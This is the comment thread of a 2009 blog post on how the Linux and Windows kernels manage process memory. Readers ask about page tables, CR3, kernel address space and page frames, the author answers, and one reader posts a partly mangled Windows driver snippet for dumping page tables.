---
layout: page
title: "Comments for How the Kernel Manages Your Memory"
date: 2014-03-08 11:10
comments: true
sharing: true
footer: true
---

**124 Responses to “How The Kernel Manages Your Memory”**

1.  jpm on February 3rd, 2009 11:56 pm

    Another awesome post!

2.  Robert on February 4th, 2009 12:47 am

    Hi

    Wonderful post!

    Got a question regarding memory in Windows though. Though not stated
    in your post, I was wondering if you could help.

    In Windows, every process has its page directory located at virtual
    addr 0xC0300000 (or page table at 0xC0000000). However, the top 2GB
    (or 1GB) of virtual address space (0×80000000 or 0xC0000000 and
    above onwards) for each process actually maps to the same physical
    space because that is the kernel mem space (which is shared and
    identical amongst all process). So how can each individual process
    actually have different page directory/tables?

    I’m sure i have an invalid logic somewhere, so kindly explain to me
    in details, if possible. Thanks

3.  Robert on February 4th, 2009 12:49 am

    Sorry if that question was out of topic….\

    ![:)](http://duartes.org/gustavo/blog/wp-includes/images/smilies/icon_smile.gif)

4.  [Gustavo Duarte](http://duartes.org/gustavo/blog) on February 4th,
    2009 1:07 am

    @jpm: thanks!

    @Robert: definitely on topic.
    ![:)](http://duartes.org/gustavo/blog/wp-includes/images/smilies/icon_smile.gif)

    The trick here is that the CPU actually wants a \_physical\_ address
    for the page directory, and \_that\_ address does change for each
    process.

    Specifically, the \_physical\_ address of the page directory must be
    loaded into a register called CR3. When the kernel is about to
    switch to a process, say notepad.exe, it will load the \_physical\_
    address of notepad’s page directory into CR3. When it switches to
    FireFox, a different physical address will go into CR3.

    If you run the Windows kernel debugger (kd.exe) and type !process,
    it’ll print the ‘DirBase’ for the currently running process, which
    is the physical address of the page directory. It’ll be different
    for every process.

    The Windows kernel must then update the system page tables to make
    0xC0300000 point to the physical address of the new page directory
    as well. The PTE for that address (0xC0300000) is not marked global,
    so that when CR3 is refreshed, its contents are purged from the TLB
    in case the processor had cached the old physical address for it.

    Hope this helps. Feel free to ask follow up questions, though the
    next answer might take a while because I’m UTC-7 and it’s 1am
    ![;)](http://duartes.org/gustavo/blog/wp-includes/images/smilies/icon_wink.gif)

5.  [web development](http://www.webdigi.co.uk) on February 4th, 2009
    4:50 am

    Great thanks for yet another good article. Nice work.

6.  Ryan on February 4th, 2009 5:43 am

    Great post. Thank you for the detail and the time you spent on the
    diagrams.

7.  [Claudio Cardozo](http://cazo-tec.blogspot.com) on February 4th,
    2009 8:05 am

    Nice article, nice diagrams! it’s so clear! tks!

8.  [Bruce Markham](http://illuminus86.blogspot.com/) on February 4th,
    2009 8:44 am

    Gustavo, I’ve been reading your posts for several weeks now. As a
    rising open-source operating system developer, I’ve found you to be
    very enlightening on topics that others are cryptic on.

    Keep up the great work!

9.  [The Thing King : Gustavo
    Duarte](http://duartes.org/gustavo/blog/post/the-thing-king) on
    February 4th, 2009 10:13 am

    [...] hope the previous post explained virtual memory adequately,
    but I must admit I held back a much better explanation, which [...]

10. [Programming Examples: Linux
    Theory](http://programmingexamples.wikidot.com/linux-theory) on
    February 4th, 2009 10:53 am

    [...]
    [https://secure.delicious.com/login?noui=yes&v=5&src=ffbmext2.1.018&partner=ffbmext](https://secure.delicious.com/login?noui=yes&v=5&src=ffbmext2.1.018&partner=ffbmext)
    [http://duartes.org/gustavo/blog/post/how-the-kernel-manages-your-memory](http://duartes.org/gustavo/blog/post/how-the-kernel-manages-your-memory)
    page tags: todo-linux page\_revision: 5, last\_edited: 1233762364|%e
    %b %Y, %H:%M %Z (%O ago) [...]

11. [Software Quality Digest – 2009-02-04 | No bug left
    behind](http://nobugleftbehind.com/software-quality-digest-2009-02-04/)
    on February 4th, 2009 12:51 pm

    [...] How The Kernel Manages Your Memory – Also by Gustavo with a
    follow-up about the related memory management by the kernel [...]

12. john on February 4th, 2009 5:30 pm

    Hi Gustavo, I have been reading your internals blogs. The diagrams
    included in these blogs look really nice and clear. What tool did
    you use to generate these diagrams (.png image files)?

13. Robert on February 4th, 2009 7:47 pm

    Hi Gustavo,

    Thanks for the prompt reply (for post no.2). That is indeed clear
    and concise. I’ve got afew follow up questions, hope you dont mind!
    ![;)](http://duartes.org/gustavo/blog/wp-includes/images/smilies/icon_wink.gif)

    For Windows, since 0xC0300000 / 0xC0000000 differs for each process,
    so am i right to say that the kernel mem space (upper 2GB) for all
    processes are actually not identical? My impression was that the
    kernel mem space for all processes are mapped to the same physical
    addr… perhaps not for Windows but for Linux only (as quoted from
    “Anatomy of a Program in Memory” -\> In Linux, kernel space is
    constantly present and mapped to the same physical memory in all
    processes.)

    Another question for Windows: should say, for example, during
    runtime process A loads a kernel driver (eg SysInternals tools),
    will this driver code actually be in the kernel address space of
    other processes as well? Will the stack data of the kernel also be
    the same across all processes?

    Thanks for the help\~!

14. wartalker on February 4th, 2009 8:07 pm

    wonderful!!

15. [links for 2009-02-04 « My
    Weblog](http://greencrab.wordpress.com/2009/02/04/links-for-2009-02-04/)
    on February 4th, 2009 9:01 pm

    [...] How The Kernel Manages Your Memory : Gustavo Duarte (tags:
    linux architecture cs) [...]

16. [Arthur](http://arthurkoziel.com) on February 5th, 2009 1:12 am

    Great article. I’m a little bit curious about the page size. You
    mention that “Both Linux and Windows map the user portion of the
    virtual address space using 4KB pages.” — what are some situations
    where bigger page sizes (2MB, 4MB) are used (if any)?

17. [Gustavo Duarte](http://duartes.org/gustavo/blog) on February 5th,
    2009 2:18 am

    Thank you all for the feedback.

    @John: It’s MS Visio 2007, here’s more info:

    [http://duartes.org/gustavo/blog/post/quick-note-on-diagrams-and-the-blog](http://duartes.org/gustavo/blog/post/quick-note-on-diagrams-and-the-blog)

    @Robert: you’re welcome. Here are the answers on the other
    questions. Windows internals is a bit tougher due to the lack of
    source code, but I think this is pretty accurate.

    ​1. You’re 100% right – kernel space in Windows is not identical for
    every process. Not only there’s this page directory issue, but also
    in Windows ‘session space’ is mapped in kernel space. So processes
    in different sessions (ie, processes on different Remote Desktop
    connections) will have difference session space, hence differences
    in their kernel space mappings. Two processes in the same session
    though would have the same session space.

    In x86 Linux the mappings for kernel space \_are\_ identical in all
    the processes. They are built during boot (see
    [here](http://duartes.org/gustavo/blog/post/kernel-boot-process))
    and stored in
    [swapper\_pg\_dir](http://lxr.linux.no/linux+v2.6.25.6/include/asm-x86/pgtable_32.h#L28)
    (that’s an extern, not the actual declaration). Since it’s Linux,
    processes are forked (copied) when they’re being started, so the
    [copy\_process()](http://lxr.linux.no/linux+v2.6.25.6/kernel/fork.c#L996)
    function is called, which [copies the memory
    descriptor](http://lxr.linux.no/linux+v2.6.25.6/kernel/fork.c#L1185),
    which eventually
    [clones](http://lxr.linux.no/linux+v2.6.25.6/arch/x86/mm/pgtable_32.c#L237)
    physical addresses of page tables in swapper\_pg\_dir into the new
    process’ page tables. Wheew! The result is simple though: shared
    kernel space for everyone.

    Regarding the driver, yes, visible to everybody.

    Regarding stack, no. Each thread has its own kernel-mode stack. But
    this can be arranged by manipulating the stack pointer to different
    virtual addresses, so no page table hacking needed. Having
    per-thread kernel stacks is important, because when a thread goes to
    sleep in the middle of a system call (say, waiting on disk) its
    state must be preserved, and that’s basically the stack (and
    registers, which get pushed onto the stack).

    @Arthur: good catch
    ![:)](http://duartes.org/gustavo/blog/wp-includes/images/smilies/icon_smile.gif)

    It turns out that Linux maps kernel space using 4MB pages. Windows
    also does it, depending on the amount of memory in the box. This is
    mainly for performance, to save entries in the TLB cache, which
    caches the physical address associated with a page. By using 4MB
    pages, the kernel uses up less TLB entries, and dirties less of them
    when handling syscalls and interrupts.

18. sesedi on February 5th, 2009 5:04 am

    Nice article, and I really want to know what program do you use to
    draw these amazing diagrams?

19. Nix on February 5th, 2009 7:07 am

    sesedi: this comes up in almost every post, I guess people like the
    diagrams
    ![;)](http://duartes.org/gustavo/blog/wp-includes/images/smilies/icon_wink.gif)
    it’s Visio.

    (You might want to try Inkscape at some point. It’s far nicer to use
    than the dire dia.)

20. [Gustavo Duarte](http://duartes.org/gustavo/blog) on February 5th,
    2009 9:32 am

    @Nix: thanks for the suggestion. I’ll give it a shot.

21. [dev-interview](http://dev-interview-questions.blogspot.com) on
    February 5th, 2009 11:41 am

    Nice article and excellent writing style.

22. [How The Kernel Manages Your Memory |
    www.pwnage.ro](http://www.pwnage.ro/2009/02/05/how-the-kernel-manages-your-memory/)
    on February 5th, 2009 12:35 pm

    [...] How The Kernel Manages Your Memory VN:F [1.0.9\_379]please
    wait…Rating: 0.0/10 (0 votes cast) [...]

23. triton on February 5th, 2009 10:02 pm

    Excellent article. I really enjoy reading them. Thanks!

    Can’t wait for Part 2.
    ![:)](http://duartes.org/gustavo/blog/wp-includes/images/smilies/icon_smile.gif)

24. [Gustavo Duarte](http://duartes.org/gustavo/blog) on February 5th,
    2009 11:29 pm

    thank you guys for the feedback.

    @triton: I’m getting pretty fast at cranking these out, I should
    have some time over the weekend
    ![;)](http://duartes.org/gustavo/blog/wp-includes/images/smilies/icon_wink.gif)

25. [Weekly linkdump \#162 - max - блог
    разработчиков](http://www.developers.org.ua/archives/max/2009/02/06/weekly-linkdump-162/)
    on February 6th, 2009 12:28 am

    [...] Много букв, цифр и красивых картинок o Linux internals, How
    The Kernel Manages Your Memory : Gustavo Duarte [...]

26. macosx on February 9th, 2009 2:09 am

    做的不错。我在这里学到了很多知识。加油！\
     Great jobs. I have learn more knowledge from here.Come on！

27. siddharth on February 10th, 2009 12:30 am

    Hi Gustavo,\
     Man ,you are just too good.Your diagrams and explanation have
    cleared many of my doubts regarding virtual memory,memory mapping.\
     Looking forward to reading many more articles in the future.

    Thanks\
     Siddharth

28. [Page Cache, the Affair Between Memory and Files : Gustavo
    Duarte](http://duartes.org/gustavo/blog/post/page-cache-the-affair-between-memory-and-files)
    on February 10th, 2009 11:53 pm

    [...] we looked at how the kernel manages virtual memory for a user
    process, but files and I/O were left out. This post covers the
    important and often [...]

29. [Gustavo Duarte](http://duartes.org/gustavo/blog) on February 11th,
    2009 8:52 am

    @siddharth: cool, I’m glad it helped!

30. Majid on February 12th, 2009 8:45 pm

    Hi Gustavo,

    your articles are interesting indeed.\
     I have a problem, when a kernel is loaded and enabled paging, all
    memory addressing is per virtual memory addressing among kernel
    itself. So when the kernel calls it’s functions or uses it’s memory
    area (variables and etc) it must follow new addressing model
    (virtual), so some things must do in boot loader like load kernel
    on, say, 0×100000 physical memory address but, say, at 0xC0000000 as
    virtual address, now if kernel switch to paging, it must map
    0×100000 to 0xC0000000 to keep on it’s running. How can I doing it?
    and how manage kernel’s memory? and when paging is enabled we must
    yet use CS, DS and SS for code, data and stack positions
    respectively?\
     Can you explain it in detail, please?

    Thanks a lot for your attention.

31. [Gustavo Duarte](http://duartes.org/gustavo/blog) on February 12th,
    2009 11:17 pm

    Majid,

    That’s a great question. I’ll give you some pointers, but I’m short
    on time.

    During the boot process, the kernel builds page tables before
    enabling virtual memory in the CPU. The initial paging tables map
    two virtual ranges onto the first 8 megabytes of physical memory.
    The code is
    [here](http://lxr.linux.no/linux+v2.6.25.6/arch/x86/kernel/head_32.S#L167).
    The first range is called the identity mapping and it maps virtual
    addresses 0-8MB (not sure on the 8MB, but something like that) onto
    physical addresses 0-8MB. The second virtual range maps another
    \~8MB starting at virtual address 0xc0000000 onto the 0-8MB of
    physical memory.

    That way, immediately after the paging is enabled, things are still
    working OK thanks to the identity mapping. The kernel can then jump
    to the 0xc0000000 addresses and it will also work thanks to the
    second range. It then calls a function called ‘zap\_low\_mappings’
    or something like that to blow away the identity mapping. Everything
    is up and running as far as paging goes by then.

    Regarding cs, ds, and ss, they are already active even before paging
    is turned on. But they use ‘flat model’ so they are basically
    transparent. They all start at 0 and span 4GB, so all logical
    addresses are the same as linear addresses, it’s as if segmentation
    does not exist. These are set up BEFORE paging is enabled though,
    they are independent of paging.

    Hope this helps. I’m going to be away for a few days, but feel free
    to post more questions and I’ll eventually get to them.

32. Majid on February 13th, 2009 3:42 am

    Thanks a lot Gustavo, your explain is really clear and fluent
    whereas it is concise.\
     That is very useful for me.\
     Thanks again for your attention and helps.

33. Majid on February 17th, 2009 8:50 pm

    Hi Gustavo,

    Excuse me for my (probably) bad english.\
     When we want to allocate new page frame, we must fill related page
    table’s entry, so we must access to page table memory address with
    it’s virtual address. What is your idea to do that? create an entry
    to link itself, so we can access it as if normal page, or another
    idea?

    Thanks

34. [Gustavo Duarte](http://duartes.org/gustavo/blog) on February 18th,
    2009 8:54 am

    Hi Majid,

    When the kernel allocates memory to store a page table, it asks the
    allocator for memory that is always mapped by the kernel space (in
    x86 Linux’s case, this means physical memory between 0 and 896MB,
    which is mapped starting at 0xc0000000). Hence page tables for
    processes can always be reached with kernel-space virtual addresses.

    The pgd pointer in the mm\_struct points to the first level of page
    tables (the page directory), so the kernel can just use the pointer
    to access it. To reach other levels of the page table, the kernel
    may have to calculate which linear address corresponds to the
    physical address of the page table, but this is easy to do because
    the first 896MB are mapped continuously in kernel space, so it’s a
    simple operation to go from physical address to virtual address.

35. [Ya-tou & me » Blog Archive » Page Cache, the Affair Between Memory
    and Files](http://jiang.eu.org/blog/?p=308) on February 19th, 2009
    1:38 am

    [...] we looked at how the kernel manages virtual memory for a user
    process, but files and I/O were left out. This post covers the
    important and often [...]

36. littlekernel on March 3rd, 2009 7:32 am

    Hi, I like your blog! you reply to Majid in \#34:\
     “(in x86 Linux’s case, this means physical memory between 0 and
    896MB,\
     which is mapped starting at 0xc0000000).”

    I have a question: In order to save physical memory, kernel and
    process\
     may map same virtual address to one physical address. For example:

    0xc500 0000 -\> 0×0500 0000\
     0×4567 0000 -\> 0×0500 0000

    Assume that kernel modifies the contents at virtual address 0×4567
    0000,\
     that is, the position at physical address 0×0500 0000, then the
    user\
     process will see this change!

    Now that kernel maps the physical memory between 0 and 896MB to 3G+\
     virtual address space , where the user process will map its
    virtual\
     address? I mean, the position of its corresponding physical
    address.

    the first 896MB physical memory belongs to kernel, right?\
     then where a user process map its virtual address?\
     If the process and the kernel share the first 896MB physical
    memory,\
     How they avoid colliding?

    this question haunting me for a long time, thank you for your help!

37. littlekernel on March 3rd, 2009 7:34 am

    sorry ,\
     Assume that kernel modifies the contents at virtual address 0×4567
    0000,\
     should be\
     Assume that kernel modifies the contents at virtual address 0×c500
    0000,

38. sxg on March 11th, 2009 1:50 am

    Hi Gustavo Duarte,\
     Nice post, very much informative! For the first time in my life, I
    understand the internals of the memory management, thank you! And I
    got a question here: where and how does the linux kernel maintains
    the physical page frames? Can you give some information about
    physical page frames’ initialization and maintenance in the kernel?

39. [Gustavo Duarte](http://duartes.org/gustavo/blog) on March 23rd,
    2009 6:39 pm

    @littlekernel,

    Sorry about the delay.

    So, the kernel does \_not\_ take the first 896MB of physical memory.
    It only takes the last 1GB of \_virtual space\_ to use it to map
    whatever physical memory it wants. In Linux’s case, the kernel uses
    this last gigabyte to map the first 896MB of \_physical\_ memory and
    then uses the remaining 128MB of virtual address space to map things
    dynamically and for other special-purpose mappings.

40. [Gustavo Duarte](http://duartes.org/gustavo/blog) on March 23rd,
    2009 6:45 pm

    @sxg: you’re welcome.

    Regarding the page frame stuff, they’re kept in an array of structs
    of type page\_structs. The array itself is called mem\_map. In
    computers where RAM access is uniform to all processors (uniform
    memory access) we usually have a single huge mem\_map array with all
    the page structs in it. This is the case for most Intel processors
    prior to the Core 2 Duo. AMD processors, and Intel now with the Core
    2 duo, are NUMA – non uniform memory access, where processors are
    attached directly to memory. In this situation you have multiple
    mem\_map arrays to describe the physical memory attached to each
    processor.

    I’ll write more about this topic, but I’m in a bit of a hiatus right
    now, I’ll post shortly on what’s going on.

41. Rohit Banga on March 25th, 2009 2:16 am

    great set of posts!\
     i want to write a kernel module to print the page table of a
    particular process and access physical memory address to read the
    value of a variable of another process. i have played a little with
    kernel modules (like changing value of runnable to 0 for init\_task,
    changing pid of all processes…resulting in flooding of kernel error
    messages ), but i am unable to proceed with this program. could you
    help me?

42. [Gustavo Duarte](http://duartes.org/gustavo/blog) on March 26th,
    2009 5:34 pm

    @Rohit: I can help some. However, it’s a bad time for me right now,
    because I started writing a blog / publishing engine to run the blog
    on, so that’s taking all my free time. Feel free to contact me
    directly via email or here via the comments.

43. iceui on April 12th, 2009 4:12 pm

    Great post!\
     I’m working on something protection-related and have a question:
    how to set one area (say, 4kB in size, or 4MB, or 8MB, etc. in
    kernel space) to be read-only or non-executable or non-writable for
    kernel itself? Thanks.

44. [Gustavo Duarte](http://duartes.org/gustavo/blog) on April 14th,
    2009 1:46 pm

    iceui: Are you thinking of it in terms of the Linux kernel API for
    these things, or in terms of what such a page table entry would look
    like in x86 processors?

45. iceui on April 14th, 2009 11:55 pm

    I’m thinking of using my driver in kernel space to do this…similar
    to kernel API…to protect other driver/API to read/write/exec some
    kernel area.

    As you point out, Linux maps kernel space using 4MB pages. Does it
    mean Kernel virtual space has, say, 1GB/4MB==250 pages? Where are
    they? Can we manipulate those kernel page table entries in terms of
    R/W, D, A, P, etc?
    [http://static.duartes.org/img/blogPosts/x86PageTableEntry4KB.png](http://static.duartes.org/img/blogPosts/x86PageTableEntry4KB.png)

    We also know Linux maps kernel virtual address 0xC0000000 to
    physical address 0×00000000…seems only one kernel page mapping
    available and we cannot modify any R/W, D, A, etc.?

    I do appreciate if you have time to clarify my doubts. Thanks!

46. CNN on April 15th, 2009 12:11 am

    Gustavo Duarte, we are eager to read your posts about the dll.

47. iceui on April 16th, 2009 3:58 am

    I’m thinking of using my driver in kernel space to do this…similar
    to kernel API…to protect other driver/API to read/write/exec some
    kernel area.

    As you point out, Linux maps kernel space using 4MB pages. Does it
    mean Kernel virtual space has, say, 1GB/4MB==250 pages? Where are
    they? Can we manipulate those kernel page table entries in terms of
    R/W, D, A, P, etc?

    We also know Linux maps kernel virtual address 0xC0000000 to
    physical address 0×00000000…seems only one kernel page mapping
    available and we cannot modify any R/W, D, A, etc.?

    I do appreciate if you have time to clarify my doubts. Thanks!

48. deepak v m on April 16th, 2009 5:46 am

    sir i want source code for static,stack and heap memory allocation
    done in graphics (whole source code) please send it to my mail .\
     i requeat you please to send me the same. ok thanking you

49. [Johnny](http://None) on April 23rd, 2009 12:54 am

    I really like your graphical representations, your pictures are even
    better than some books, Great!

50. Narayanan on April 26th, 2009 12:05 am

    hi Gustavo,

    Nice work. please continue your posting.

    I need clarification on swappable and now swappable pages in the
    memory, I ve heard that certain pages are not swappable. can you
    please explain on that..? .

    Are you going to post on Linux Block I/O .? I m very interested on
    it.

51. [Gustavo Duarte](http://duartes.org/gustavo/blog) on April 26th,
    2009 1:18 am

    @Narayanan: thanks for the feeback. I’ll definitely continue
    posting. To be honest, I took a little detour writing software to
    post \_with\_. That’s why the blog has been quiet. I’ll give an
    update on this stuff soon, but in short, there will definitely be
    more content.

52. [Joel](http://www.hackerbliss.org) on June 18th, 2009 6:37 am

    Hi Duarte,\
     I have read and re-read your articles several times, they’re just
    like story-telling, Thank you.

    I have a burning question: The kernel has a page structure that
    describes a physical page in memory. But this description does not
    including the physical address of the page. How is this retrieved?
    (I understand pte structures have the physical address data but how
    we reference a pte structure from a page structure?)

    Also I understand that mem\_map is a global variable that is a list
    of all pages in physical memory (correct me if I’m wrong). But, what
    use this array if we can’t figure out the physical address of a
    page?

    Thanks!\
     Joel

53. Ronaldo on July 14th, 2009 2:25 am

    I have read your post. Its excellent.

    I am trying to understand the concept of virtual memory. But however
    hard I try.. I still dont get it. My bsaic question is as follows:

    Virtual address from 0×00000000 to 0×00300000 are mapped to physical
    addresses 0×00000000 to 0×00300000. ie we have an identity mapping,
    by means of page tables some where in physical memory whose virtual
    addresses are not known.

    Now my physical frame allocator says that a page in physical memory
    starting at addresses 0×00400000 is free ie page frame 1024 is free.

    How can I now access this page

54. naveen on July 24th, 2009 3:24 am

    Great thanks Gustavo Duarte…this article is excellent..

    Can you please give us some reference to good websites or blogs that
    deals with in depth about Kernel core.

55. srikanth on August 2nd, 2009 8:23 pm

    HI Gustavo Duarte,

    I do not why you are taking so much effort to explain such excellent
    articles. I really appreciate your efforts.

    Thank you very much …….

56. Rohit Banga on August 27th, 2009 3:04 am

    Hello\
     Gustavo, you done with with your blog engine. doing it alone!\
     it seems you are writing well engineered code. that is why it is
    taking so much of time.

57. Atul Deshmukh on September 9th, 2009 7:05 am

    Hi Gustavo,\
     I must appreciate ur great work..Actually,putting the things with
    examples and with source code is really expected while studing linux
    kernel internals.\
     Being a linux freak,I started to read ur article on memory mgmt amd
    couldnt stop myself from further reading..Great work indeed.

58. Atul Deshmukh on September 9th, 2009 7:13 am

    Hi Gustavo,\
     I agree with Joel.\
     The high memory stuff in which page discrptrs are allocated instead
    of pages since those pages dont have corresponding logical kernel
    address,is somewhere missing in your article.\
     I hope u will come up with it..\
     Anyways Kudos for your great work.

59. bnousilal on October 10th, 2009 8:37 pm

    hi sir………..\
     nice work,really fantastic and awesome work, please continue your
    posting…..

60. Shammi on November 1st, 2009 11:13 pm

    Hello Gustavo,

    I recently found these blog. It is very helpful for me to understand
    some basic things. I really appreciate your time for this.

    I have some basic doubts, which i think you can easily answer.

    ​1) If we have same shared libraries(eg: libc.so) loaded for more
    than 2 process. The shared library VM address in the two process
    will be identical or different ?, as far as i know, in physical
    memory they will be loaded only once.

    ​2) The entire VM address of a process is created during process
    creation, or the VM address is also created dynamically ?. eg: if i
    am creating a process p1(which uses lots of shared libraries), the
    whole VM address (if it uses a VM address space of 2GB) is allocated
    dynamically or statically during process creation.

    Can you please address my queries ?.

    Regards,\
     Shammi

61. [Joel Fernandes](http://www.hackerbliss.org) on November 23rd, 2009
    12:21 am

    Hi Shammi,

    There are different sections that are required for every section,
    different VM area structs are created for these. VM addresses are
    allocated for these sections by default. Access to any other virtual
    address results in a fault. The process ofcourse has all the memory
    for itself (no one else can take it) but to make this memory
    accessible dynamically, you would do it in many ways: malloc to
    allocate memory on the heap, grow the heap with brk system call or
    memory map a file.

    Hope this answers your question.

62. [Joel Fernandes](http://www.hackerbliss.org) on November 23rd, 2009
    12:27 am

    Hi Shammi,

    Answering your first question, the shared library virtual addresses
    could be different (shared libraries are compiled with position
    independent code so they can be relocated any where in virtual
    memory) – the dynamic loader takes care of resolving symbols at
    runtime. The shared library’s physical memory is allocated only once
    and shared by all other processes (think about how many different
    copies of the c standard library would be there otherwise
    ![:)](http://duartes.org/gustavo/blog/wp-includes/images/smilies/icon_smile.gif)
    ).

63. Lin yujing on December 16th, 2009 2:02 am

    Wonderful!\
     I have a question, there is only 20 bit for physical address. How
    could it represents the memory physical address?

    Thank you!

64. [leal](http://www.leal.cn) on December 30th, 2009 10:53 pm

    Hi Lin,\
     kernel manages physical memory with unit of 4KB, which is 2\^12, so
    20bit is left enough to address these 4KB unit on 32-bit platform.

65. [Interesting Reading… – The Blogs at
    HowStuffWorks](http://blogs.howstuffworks.com/2009/02/05/intesting-reading/)
    on January 11th, 2010 11:09 am

    [...] How The Kernel Manages Your Memory – “After examining the
    virtual address layout of a process, we turn to the kernel and its
    mechanisms for managing user memory…” [...]

66. sagar bansal on March 4th, 2010 2:18 pm

    i need to know the exact procedure what happens wen page is selected
    to swap out..where in pte entry is made?? low level details wat
    struct is used??\
     plz help me out

67. Aman on April 4th, 2010 1:42 pm

    Hi Gustavo!

    I have few confusions really hurting me

    - files get mapped and unmapped in “memory map segment” of a
    process. Even worse that different portions of one file can get
    mapped at different location in mmap\_segment. Now consider that our
    memory map segment has consumed 1MB virtual address space. And a
    file segment from 1k – 20k segment gets unmapped. Now we have
    fragmented mmap\_region. How the fragmentation in memory map segment
    is handled???\
     - One base pointer of mmap\_segment is present in picture but no
    pointer pointing to top of mmap\_segment. How we will know that how
    much mmap\_segment’s virtual memory has been consumed???

    Regards,\
     Aman

68. Mandar on April 14th, 2010 3:37 am

    Have a question very similar to that by “littlekernel”. When Linux
    maps its kernel virtual address space (starting from PAGE\_OFFSET)
    to 896 MB of physical memory, it essentially creates page tables
    that map all the page frames in this 896 MB area, correct? Of
    course, the kernel itself consumes only few megabytes of physical
    memory, but because all the addressable RAM is mapped into the 1 GB
    kernel virtual address space, how do we map 3 GB of user virtual
    address space? Every page frame referenced by a process page table
    (via one of the first 768 entries in the page global directory) will
    also have a corresponding entry in the kernel page table (the
    remaining 256 or so entries) because that page frame has already
    been mapped into the kernel address space during boot time. Am I
    missing something?

69. [eko didik widianto](http://edwidianto.wordpress.com) on June 6th,
    2010 4:22 am

    Thank you very much.

    Keep on your good work.

70. Sakthikumar Rajaram on June 10th, 2010 5:18 am

    Hi Gustavo,

    Iam Sakthikumar. Iam working in Motorola.

    I have a doubt.

    You said driver written in windows will be visible to all the user
    processes

    Is that possible for that driver to access all the user processes
    details (data,heap,stack,BSS,memory mapping) details and encrypt it
    before sending it to RAM Page Frames.

    Waiting for your reply

    Regards\
     Sakthikumar

71. Hugho on July 2nd, 2010 9:57 am

    Hello,

    Thanks for explaining PDEs. But I have a problem which I still can’t
    solve. I wrote a kernel driver for accessing the PDE and PTEs at
    0xC0600000 (Win 7 PAE) and dumped the mem with a small kernel
    routine – with the result, that at the above mentioned address there
    is nothing than zeros – even at 0xC0000000. With LiveKd & WinDbg
    (Local Kernel debug) I get the correct entries at this memory loc.
    Would you please tell me what I’m doin wrong? thanks for any
    answers!

    Here’s the src of my kernel driver:

    include\
     \#include “memory.h”

    \#define \_PDTP\_MASK 0xC0000000\
     \#define \_PDE\_MASK 0x3FE00000\
     \#define \_PTE\_MASK 0x001FF000\
     \#define \_POFF\_MASK 0x00000FFF

    \#define \_PDTP\_SHIFT 30\
     \#define \_PDE\_SHIFT 21\
     \#define \_PTE\_SHIFT 12

    \#define \_SYSTEM\_PDP\_BASE 0xC0300000\
     \#define \_SYSTEM\_PDP\_BASE\_PAE 0xC0600000

    \#define \_PTE\_SIZE 8

    \#pragma pack(1)\
     typedef struct\
     {\
     unsigned int Valid : 1;\
     unsigned int Dirty1 : 1;\
     unsigned int Owner : 1;\
     unsigned int WriteThrough : 1;\
     unsigned int CacheDisable : 1;\
     unsigned int Accessed : 1;\
     unsigned int Dirty : 1;\
     unsigned int LargePage : 1;\
     unsigned int Global : 1;\
     unsigned int CopyOnWrite : 1;\
     unsigned int Unused : 1;\
     unsigned int Write : 1;\
     ULONG PageFrameNumber : 26;\
     } \_\_MMPTE, \*\_\_PMMPTE;

    \#pragma pack()

    static ULONG64 PagePTE;\
     static PHYSICAL\_ADDRESS PhysAddr;\
     static ULONG64 \*pllu, llu;\
     static PMDL pMyMDL= NULL;

    void DumpMem( UCHAR\* pos, ULONG Size)\
     {\
     ULONG i, a;

    for( i= 0; i \<= Size; i+=16)\
     {\
     DbgPrint(“0x%08lX:\\t”, (ULONG) pos );\
     for(a=0; a \> (ULONG) \_PDTP\_SHIFT) \* (ULONG)\_PTE\_SIZE;\
     PDTP= ((ULONG) temp + (ULONG) + 0xC0600000 );\
     DbgPrint( “Temp:\\t0x%08lx\\n”, temp );\
     DbgPrint( “PageDirTablePointerEntry:\\t0x%08lx\\n”, PDTP );\
     \_asm\
     {\
     cli\
     };\
     DumpMem( 0xC0600000, 32 );\
     \_asm\
     {\
     sti\
     };\
     PDTPE= (\_\_PMMPTE) PDTP;\
     pllu= (PULONG64) PDTP;\
     pMyMDL= MmCreateMdl( NULL,\
     0xC0000000,\
     4096 );\
     MmBuildMdlForNonPagedPool( pMyMDL );\
     pMyMDL-\>MdlFlags = pMyMDL-\>MdlFlags |
    MDL\_MAPPED\_TO\_SYSTEM\_VA;\
     pllu= (PULONG64) MmMapLockedPages( pMyMDL, KernelMode );\
     DbgPrint(“Content:\\t0x%llx\\n”, \*pllu);\
     DumpMem( (UCHAR \*) 0xC0000000, 32 );\
     MmUnmapLockedPages( pllu, pMyMDL );\
     IoFreeMdl( pMyMDL );

    // if( PDTPE-\>Valid != 1 )\
     // {\
     // DbgPrint( “is not in memory\\n” );\
     // return (status= STATUS\_UNSUCCESSFUL );\
     // }\
     DbgPrint(“is in memory\\n”);

    return status;\
     }

    void OnUnload( IN PDRIVER\_OBJECT DriverObject )\
     {\
     }

    NTSTATUS DriverEntry( PDRIVER\_OBJECT DriverObject, PUNICODE\_STRING
    RegistryPath )\
     {\
     int i;\
     NTSTATUS status;\
     DriverObject-\>DriverUnload= OnUnload;\
     GetPagePTEAddress( 0x8e221000 );\
     for( i= 0; i \< 100000; i++ );\
     status= STATUS\_SUCCESS;\
     return status;\
     }

    As dump I get only zeros at 0xC0600000 but by LiveKd I get\
     the correct page table entries!

    ||0:lkd\> dc 0xC0600000\
     c0600000 a8fed867 00000000 94235867 00000000 g…….gX\#…..\
     c0600010 0783c867 00000000 0d1f4867 00000000 g…….gH……\
     c0600020 2c89a867 00000000 306a4867 00000000 g..,….gHj0….\
     c0600030 00000000 00000000 00000000 00000000 …………….\
     c0600040 00000000 00000000 00000000 00000000 …………….\
     c0600050 00000000 00000000 373d6867 00000000 ……..gh=7….\
     c0600060 42b93867 00000000 1aca3867 00000000 g8.B….g8……\
     c0600070 00000000 00000000 00000000 00000000 …………….

72. Hugho Deferell on July 2nd, 2010 10:43 am

    Hello,

    why did you delete my post?

73. Hugho Deferell on July 2nd, 2010 10:50 am

    Hmmm, Ok, I post it again
    ![:-|](http://duartes.org/gustavo/blog/wp-includes/images/smilies/icon_neutral.gif)

    I wrote a kernel driver for accessing the page directory / page
    tables on Windows 7 (PAE 32 Bit). In this driver I put a small
    memdump routine for dumping mem eg. @ 0xC0600000. But as a result I
    got ONLY zeros as dump \# 0xC0600000 & 0xC0000000. LiveKd & WinDbg
    (local kernel debug) shows me the correct result. What I’m doin
    wrong?

74. duncan on December 7th, 2010 7:15 am

    how to know a process’s all of memory spaces?\
     I execute a Firefox… and then I execute a system call , to get its
    v-addre,

    for\_each\_process() -\> mm -\> mmap -\> vm\_start & vm\_end -\> a
    loop to get every entry start and end…\
     but how to get this process’s address in kernel space ?

